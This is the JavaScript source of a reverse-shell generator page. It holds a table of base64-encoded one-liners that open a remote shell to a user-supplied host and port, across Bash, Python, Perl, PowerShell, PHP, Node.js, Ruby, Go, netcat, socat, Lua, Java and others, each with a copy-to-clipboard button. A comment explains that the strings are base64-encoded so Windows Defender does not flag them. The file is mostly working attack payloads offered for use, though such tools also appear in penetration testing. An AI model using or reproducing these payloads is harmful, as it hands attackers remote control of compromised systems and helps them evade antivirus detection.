
const STORAGE_KEY = 'ATTACKER';

function main() {
  // Get LHOST and LPORT info from session storage if exists.
  let listenInfo = window.sessionStorage.getItem(STORAGE_KEY);
  listenInfo = JSON.parse(listenInfo);
  const lhost = (listenInfo && listenInfo.lhost) || '10.0.0.1';
  const lport = (listenInfo && listenInfo.lport) || '4444';
  drawRevShellList(lhost, lport);

  // Form input default value.
  $('#inputLHOST').val(lhost);
  $('#inputLPORT').val(lport);

  // Submit when press enter key.
  $('#inputLHOST').keypress(function (e) {
    if (e.which === 13) {
      submit();
      return false;
    }
  });
  $('#inputLPORT').keypress(function (e) {
    if (e.which === 13) {
      submit();
      return false;
    }
  });
}

function submit() {
  const lhost = $('#inputLHOST').val().toString();
  const lport = $('#inputLPORT').val().toString();
  if (lhost !== "" && lport !== "") {
    $('#revshList').empty();
    drawRevShellList(lhost, lport);
    // Set LHOST and LPORT info into session storage.
    const listenInfo = {'lhost': lhost, 'lport': lport};
    window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(listenInfo));
  }
}

function drawRevShellList(lhost, lport) {
  languages = Object.keys(reverseShells)
  for (let i = 0; i < languages.length; i++) {
    const language = languages[i];
    for (let j = 0; j < reverseShells[language].length; j++) {
      let reverseShell = reverseShells[language][j]; // Base64 revshell string
      reverseShell = atob(reverseShell);
      //console.log(reverseShell);
      reverseShell = reverseShell.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
      reverseShell = reverseShell.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      //console.log(reverseShell);

      // Template
      $('#revshList').append(`
      <li id="revsh_${i}_${j}" class="list-group-item d-flex justify-content-between align-items-start">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${language}</div>
          <code class="copy_target">${reverseShell}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top"
          title="Copy to clipboard" id="copy-input">
          Copy
        </button>
      </li>
      `);

      // Reverse Shell
      const $revsh = $(`#revsh_${i}_${j}`);
      $revsh.click(function () {
        $revsh.find('.copy_input').trigger('click'); // 枠内をクリックするとコピー押下する
        return false;
      })

      // Copy Button
      const $copy_input = $revsh.find('.copy_input');
      $copy_input.click(function () {
        // 対象の文字列をinputに格納してからコピーする
        const text = $revsh.find('.copy_target').text();
        $('#input').val(text);
        var copyText = document.querySelector("#input");
        copyText.select();
        document.execCommand("copy");
        // コピー完了したらツールチップ表示
        $(this).tooltip('show');
        // コピー完了したら強調表示
        $('.my-active').removeClass('my-active');
        $revsh.addClass('my-active');
        return false;
      });
      //「Copy」ボタンのツールチップ（補足説明）の設定
      $copy_input
        .tooltip({
          trigger: 'manual'
        })
        // tooltip表示後の動作を設定
        .on('shown.bs.tooltip', function () {
          setTimeout((function () {
            $(this).tooltip('hide');
          }).bind(this), 1500);
        });
    }
  }
}

// ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
// {0}はIPアドレス、{1}はポート番号に置換される。

reverseShells = {

  "Bash": [
    'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',
    'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='
  ],

  "Python": [
    'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='
  ],
  "Python3": [
    'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInswfSIsezF9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'
  ],

  "Perl": [
    'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn',
    'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw=='
  ],
  "Perl (Windows)": [
    'cGVybCAtTUlPIC1lICckYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwiezB9OnsxfSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc='
  ],

  "PowerShell": [
    'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ==',
    'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg=='
  ],

  "PHP": [
    "cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=",
    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=",
    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc=",
    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzeXN0ZW0oIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==",
    "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc=",
    "cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTsgJHByb2MgPSBwcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwgJHBpcGVzKTsn",
  ],

  "Node.js": [
    'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='
  ],

  "Ruby": [
    'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn',
    'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=',
  ],
  "Ruby (Windows)": [
    'cnVieSAtcnNvY2tldCAtZSAnYz1UQ1BTb2NrZXQubmV3KCJ7MH0iLCJ7MX0iKTt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt7fGlvfGMucHJpbnQgaW8ucmVhZH19ZW5kJw=='
  ],

  "Golang": [
    'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiezB9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28='
  ],

  "netcat": [
    'bmMgLWUgL2Jpbi9zaCB7MH0gezF9',
    'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=',
    'bmMgLWMgYmFzaCB7MH0gezF9',
  ],
  "netcat (OpenBSD)": [
    "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgezB9IHsxfSA+L3RtcC9m"
  ],

  "ncat": [
    'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==',
    'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='
  ],

  "AWK": [
    'YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw='
  ],

  "lua (Linux)": [
    'bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgnezB9JywnezF9Jyk7b3MuZXhlY3V0ZSgnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsi'
  ],
  "lua": [
    'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'
  ],

  "Java": [
    'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw=='
  ],

  "socat": [
    'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9',
  ],
  "socat (Windows)": [
    "c29jYXQuZXhlIC1kIC1kIFRDUDQ6ezB9OnsxfSBFWEVDOidjbWQuZXhlJyxwaXBlcw=="
  ],

  "telnet": ['cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w']

}


function htmlEscape(str) {
  if (!str) return;
  return str.replace(/[<>&"'`]/g, function (match) {
    const escape = {
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#39;',
      '`': '&#x60;'
    };
    return escape[match];
  });
}
